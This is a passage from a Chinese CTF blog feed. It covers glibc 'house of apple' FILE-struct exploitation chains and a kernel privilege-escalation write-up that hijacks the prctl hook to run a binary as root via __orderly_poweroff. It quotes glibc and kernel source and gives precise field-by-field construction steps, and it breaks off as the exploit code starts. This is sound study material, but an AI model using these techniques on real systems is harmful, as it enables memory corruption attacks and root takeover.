delta;</span><br><span class="line">    <span class="keyword">int</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*    char* ptr = cur_ptr(); */</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">        <span class="keyword">if</span> (_IO_do_flush(fp)) <span class="keyword">return</span> EOF;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>满足<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_do_flush(_f) \</span></span><br><span class="line"><span class="meta">  ((_f)-&gt;_mode &lt;= 0                                  \</span></span><br><span class="line"><span class="meta">   ? _IO_do_write(_f, (_f)-&gt;_IO_write_base,                      \</span></span><br><span class="line"><span class="meta">          (_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base)              \</span></span><br><span class="line"><span class="meta">   : _IO_wdo_write(_f, (_f)-&gt;_wide_data-&gt;_IO_write_base,              \</span></span><br><span class="line"><span class="meta">           ((_f)-&gt;_wide_data-&gt;_IO_write_ptr                  \</span></span><br><span class="line"><span class="meta">            - (_f)-&gt;_wide_data-&gt;_IO_write_base)))</span></span><br></pre></td></tr></table></figure><p>使<code>fp-&gt;_mode &gt; 0</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">    _IO_wdo_write (FILE *fp, <span class="keyword">const</span> <span class="keyword">wchar_t</span> *data, <span class="keyword">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> =</span> fp-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (to_do &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (fp-&gt;_IO_write_end == fp-&gt;_IO_write_ptr</span><br><span class="line">            &amp;&amp; fp-&gt;_IO_write_end != fp-&gt;_IO_write_base)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (_IO_new_do_write (fp, fp-&gt;_IO_write_base,</span><br><span class="line">                                  fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) == EOF)</span><br><span class="line">                <span class="keyword">return</span> WEOF;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Now convert from the internal format into the external buffer.  */</span></span><br><span class="line">            result = __libio_codecvt_out (cc, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">                                          data, data + to_do, &amp;new_data,</span><br><span class="line">                                          write_ptr,</span><br><span class="line">                                          buf_end,</span><br><span class="line">                                          &amp;write_ptr);</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>满足<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>，然后这个判断需要为假<code>fp-&gt;_IO_write_end == fp-&gt;_IO_write_ptr &amp;&amp; fp-&gt;_IO_write_end != fp-&gt;_IO_write_base</code>。</p><p>构造方式：</p><ol><li><code>vtable</code>设置为<code>_IO_file_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_new_file_sync</code>即可</li><li><code>_IO_write_ptr &gt; _IO_write_base</code>，即满足<code>*(fp + 0x28) &gt; *(fp + 0x20)</code></li><li><code>_mode &gt; 0</code>，即满足<code>(fp + 0xc0) &gt; 0</code></li><li><code>_IO_write_end != _IO_write_ptr</code>或者<code>_IO_write_end == _IO_write_base</code>，即满足<code>*(fp + 0x30) != *(fp + 0x28)</code>或者<code>*(fp + 0x30) == *(fp + 0x20)</code></li><li><code>_wide_data</code>设置为堆地址，假设地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_write_ptr &gt;= _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &gt;= *(A + 0x18)</code></li><li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li><li><code>codecvt-&gt;__cd_out.step</code>设置为可控堆地址<code>C</code>，即满足<code>*(B + 0x38) = C</code></li><li><code>codecvt-&gt;__cd_out.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li><li><code>codecvt-&gt;__cd_out.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>_wide_data</code>也可控的话，<code>rsi</code>也能控制。</li></ol><h4 id="IO-wfile-sync"><a href="#IO-wfile-sync" class="headerlink" title="_IO_wfile_sync"></a><strong>_IO_wfile_sync</strong></h4><p>调用链：<code>_IO_wfile_sync</code>=&gt;<code>__libio_codecvt_length</code>=&gt;<code>DL_CALL_FCT</code>=&gt;<code>gs =</code> <code>fp-&gt;_codecvt-&gt;__cd_in.step</code>=&gt;<code>*(gs-&gt;__fct)(gs)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">wint_t</span></span><br><span class="line">    _IO_wfile_sync (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">ssize_t</span> delta;</span><br><span class="line">    <span class="keyword">wint_t</span> retval = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*    char* ptr = cur_ptr(); */</span></span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">        <span class="keyword">if</span> (_IO_do_flush (fp))</span><br><span class="line">            <span class="keyword">return</span> WEOF;</span><br><span class="line">    delta = fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">    <span class="keyword">if</span> (delta != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* We have to find out how many bytes we have to go back in the</span></span><br><span class="line"><span class="comment">     external buffer.  */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cv</span> =</span> fp-&gt;_codecvt;</span><br><span class="line">        <span class="keyword">off64_t</span> new_pos;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> clen = __libio_codecvt_encoding (cv);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (clen &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="comment">/* It is easy, a fixed number of input bytes are used for each</span></span><br><span class="line"><span class="comment">       wide character.  */</span></span><br><span class="line">            delta *= clen;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* We have to find out the hard way how much to back off.</span></span><br><span class="line"><span class="comment">         To do this we determine how much input we needed to</span></span><br><span class="line"><span class="comment">         generate the wide characters up to the current reading</span></span><br><span class="line"><span class="comment">         position.  */</span></span><br><span class="line">            <span class="keyword">int</span> nread;</span><br><span class="line">            <span class="keyword">size_t</span> wnread = (fp-&gt;_wide_data-&gt;_IO_read_ptr</span><br><span class="line">                             - fp-&gt;_wide_data-&gt;_IO_read_base);</span><br><span class="line">            fp-&gt;_wide_data-&gt;_IO_state = fp-&gt;_wide_data-&gt;_IO_last_state;</span><br><span class="line">            nread = __libio_codecvt_length (cv, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">                                            fp-&gt;_IO_read_base,</span><br><span class="line">                                            fp-&gt;_IO_read_end, wnread);</span><br><span class="line">            ......</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &lt;= fp-&gt;_wide_data-&gt;_IO_write_base</code>和<code>fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end != 0</code>。可以看到这里还需要绕过<code>__libio_codecvt_encoding</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">__libio_codecvt_encoding (struct _IO_codecvt *codecvt)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* See whether the encoding is stateful.  */</span></span><br><span class="line">  <span class="keyword">if</span> (codecvt-&gt;__cd_in.step-&gt;__stateful)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="comment">/* Fortunately not.  Now determine the input bytes for the conversion</span></span><br><span class="line"><span class="comment">     necessary for each wide character.  */</span></span><br><span class="line">  <span class="keyword">if</span> (codecvt-&gt;__cd_in.step-&gt;__min_needed_from</span><br><span class="line">      != codecvt-&gt;__cd_in.step-&gt;__max_needed_from)</span><br><span class="line">    <span class="comment">/* Not a constant value.  */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> codecvt-&gt;__cd_in.step-&gt;__min_needed_from;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置<code>fp-&gt;codecvt-&gt;__cd_in.step-&gt;__stateful != 0</code>即可返回<code>-1</code>。</p><p>构造方式：</p><ol><li><code>_flags</code>设置为<code>~(4 | 0x10)</code></li><li><code>vtable</code>设置为<code>_IO_wfile_jumps</code>地址（加减偏移），使其能成功调用<code>_IO_wfile_sync</code>即可</li><li><code>_wide_data</code>设置为堆地址，假设其地址为<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_write_ptr &lt;= _wide_data-&gt;_IO_write_base</code>，即满足<code>*(A + 0x20) &lt;= *(A + 0x18)</code></li><li><code>_wide_data-&gt;_IO_read_ptr != _wide_data-&gt;_IO_read_end</code>，即满足<code>*A != *(A + 8)</code></li><li><code>_codecvt</code>设置为可控堆地址<code>B</code>，即满足<code>*(fp + 0x98) = B</code></li><li><code>codecvt-&gt;__cd_in.step</code>设置为可控堆地址<code>C</code>，即满足<code>*B = C</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__stateful</code>设置为非<code>0</code>，即满足<code>*(B + 0x58) != 0</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__shlib_handle</code>设置为<code>0</code>，即满足<code>*C = 0</code></li><li><code>codecvt-&gt;__cd_in.step-&gt;__fct</code>设置为地址<code>D</code>,地址<code>D</code>用于控制<code>rip</code>，即满足<code>*(C + 0x28) = D</code>。当调用到<code>D</code>的时候，此时的<code>rdi</code>为<code>C</code>。如果<code>rsi</code>为<code>&amp;codecvt-&gt;__cd_in.step_data</code>可控。</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>house of apple1主要作用就是实现任意地址写，而我认为house of apple2是最吊的，一定程度上减少了覆盖这个SB pointer_guard。而house of apple3在构造方面要求相对来说较为苛刻。(我还跟个SB一样准备自己写pack_file函数来构造IO_FILE结构体，但是我发现pwntools居然有<code>FileStructure()</code>这个函数可以直接生成)</p><hr><p>参考链接：</p><p><a class="link"   href="https://bbs.pediy.com/thread-273832.htm#msg_header_h3_2" >https://bbs.pediy.com/thread-273832.htm#msg_header_h3_2<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://bbs.pediy.com/thread-273863.htm#msg_header_h3_3" >https://bbs.pediy.com/thread-273863.htm#msg_header_h3_3<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;死都想不到house of apple居然有三篇文章，这里就把第二篇和第三篇合并起来一起学完吧。&lt;/p&gt;
&lt;h2 id=&quot;house-of-apple2&quot;&gt;&lt;a href=&quot;#house-of-apple2&quot; class=&quot;headerlink&quot; title=&quot;house </summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="house of 系列" scheme="https://cv196082.gitee.io/tags/house-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn内存任意读写提升权限[2]</title>
    <link href="https://cv196082.gitee.io/2022/08/04/kernel-pwn%E5%86%85%E5%AD%98%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90-2/"/>
    <id>https://cv196082.gitee.io/2022/08/04/kernel-pwn%E5%86%85%E5%AD%98%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90-2/</id>
    <published>2022-08-04T07:50:55.000Z</published>
    <updated>2022-08-10T07:33:58.741Z</updated>
    
    <content type="html"><![CDATA[<p>这次的例题是solid_core，题目的整体和前面那一道stringipc几乎一样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x77617369</span>:</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(&amp;v27, a3, <span class="number">24LL</span>) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    v5 = v3 + <span class="number">1</span>;</span><br><span class="line">    mutex_lock(v3 + <span class="number">1</span>);</span><br><span class="line">    v16 = *v3;</span><br><span class="line">    v7 = v29;</span><br><span class="line">    <span class="keyword">if</span> ( !*v3 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_39;</span><br><span class="line">    v17 = *((_QWORD *)v16 + <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)(v17 + v29) &gt; *((_QWORD *)v16 + <span class="number">2</span>) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_25;</span><br><span class="line">    v18 = *((_QWORD *)v16 + <span class="number">1</span>) + v17;</span><br><span class="line">    <span class="keyword">if</span> ( v18 &lt;= <span class="number">0xFFFFFFFF7FFFFFFF</span>LL )</span><br><span class="line">    &#123;</span><br><span class="line">        printk(&amp;unk_779, v28);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( strncpy_from_user(v18, v28, v29) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_25;</span><br></pre></td></tr></table></figure><p>但是在写内容的这个地方和那一道题有些许不同，这里禁止往0xFFFFFFFF80000000之前的地址写入了，这也就导致昨天的两种利用方式无法使用了。</p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>Prctl是linux的一个函数，可以对进程、线程做一些设置，prctl内部通过虚表来调用对应的功能，如果我们劫持prctl的虚表，使它指向其他对我们有帮助的内核函数，比如call_usermodehelper函数，该函数执行一个用户传入的二进制文件，且以root权限执行，由此可以利用起来提权。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE5(prctl, <span class="keyword">int</span>, option, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg3,</span><br><span class="line">                <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg5)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">me</span> =</span> current;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> comm[<span class="keyword">sizeof</span>(me-&gt;comm)];</span><br><span class="line">    <span class="keyword">long</span> error;</span><br><span class="line"></span><br><span class="line">    error = security_task_prctl(option, arg2, arg3, arg4, arg5);</span><br><span class="line">    <span class="keyword">if</span> (error != -ENOSYS)</span><br><span class="line">        <span class="keyword">return</span> error;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>prctl源码中调用了security_task_prctl函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">security_task_prctl</span><span class="params">(<span class="keyword">int</span> option, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg2, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg3,</span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">unsigned</span> <span class="keyword">long</span> arg4, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> thisrc;</span><br><span class="line">    <span class="keyword">int</span> rc = -ENOSYS;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">security_hook_list</span> *<span class="title">hp</span>;</span></span><br><span class="line"></span><br><span class="line">    list_for_each_entry(hp, &amp;security_hook_heads.task_prctl, <span class="built_in">list</span>) &#123;</span><br><span class="line">        thisrc = hp-&gt;hook.task_prctl(option, arg2, arg3, arg4, arg5);</span><br><span class="line">        <span class="keyword">if</span> (thisrc != -ENOSYS) &#123;</span><br><span class="line">            rc = thisrc;</span><br><span class="line">            <span class="keyword">if</span> (thisrc != <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数调用了task_prctl表里的函数，因此，如果我们劫持task_prctl表，就能通过执行prctl来执行我们想要的函数，比如call_usermodehelper函数。</p><p>提一下call_usermodehelper函数，这个函数可以在内核中直接新建和运行用户空间程序，并且该程序具有root权限，因此只要将参数传递正确就可以执行任意命令。起初的利用思路是劫持prctl的hook到这个函数，但存在一个问题，hp-&gt;hook.task_prctl(option, arg2, arg3, arg4, arg5);这里的option是int类型的，会存在一个截断，而四字节的地址一般是用户态地址，由于题目有smap显然是不行的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">call_usermodehelper</span><span class="params">(<span class="keyword">char</span> *path, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp, <span class="keyword">int</span> wait)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">info</span>;</span></span><br><span class="line"><span class="keyword">gfp_t</span> gfp_mask = (wait == UMH_NO_WAIT) ? GFP_ATOMIC : GFP_KERNEL;</span><br><span class="line"></span><br><span class="line">info = call_usermodehelper_setup(path, argv, envp, gfp_mask,</span><br><span class="line"> <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (info == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> call_usermodehelper_exec(info, wait);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看引用发现mce_do_trigger函数有调用call_usermodehelper并且第一个参数为全局变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">mce_do_trigger</span><span class="params">(struct work_struct *work)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">call_usermodehelper(mce_helper, mce_helper_argv, <span class="literal">NULL</span>, UMH_NO_WAIT);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是需要改的东西比较多，所以寻找更好的gadget</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">run_cmd</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> **argv;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *envp[] = &#123;</span><br><span class="line"><span class="string">&quot;HOME=/&quot;</span>,</span><br><span class="line"><span class="string">&quot;PATH=/sbin:/bin:/usr/sbin:/usr/bin&quot;</span>,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line">argv = argv_split(GFP_KERNEL, cmd, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (argv) &#123;</span><br><span class="line">ret = call_usermodehelper(argv[<span class="number">0</span>], argv, envp, UMH_WAIT_EXEC);</span><br><span class="line">argv_free(argv);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">ret = -ENOMEM;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __orderly_reboot(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">ret = run_cmd(reboot_cmd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ret) &#123;</span><br><span class="line">pr_warn(<span class="string">&quot;Failed to start orderly reboot: forcing the issue\n&quot;</span>);</span><br><span class="line">emergency_sync();</span><br><span class="line">kernel_restart(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __orderly_poweroff(<span class="keyword">bool</span> force)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">ret = run_cmd(poweroff_cmd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ret &amp;&amp; force) &#123;</span><br><span class="line">pr_warn(<span class="string">&quot;Failed to start orderly shutdown: forcing the issue\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * I guess this should try to kick off some daemon to sync and</span></span><br><span class="line"><span class="comment"> * poweroff asap.  Or not even bother syncing if we&#x27;re doing an</span></span><br><span class="line"><span class="comment"> * emergency shutdown?</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">emergency_sync();</span><br><span class="line">kernel_power_off();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里的run_cmd是会调用call_usermodehelper，我们只需要把prctl_task劫持到这几个函数，比如__orderly_poweroff，然后篡改poweroff_cmd为我们需要执行的二进制文件路径。接着调用prctl，就会以root权限执行我们的二进制文件，从而提权。为了实现上述目标，我们首先需要得到内核基址，在上一篇也提到了怎么计算出vdso地址，我们有了vdso地址也可以得出内核基地址了。</p><p>综上可得出exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span 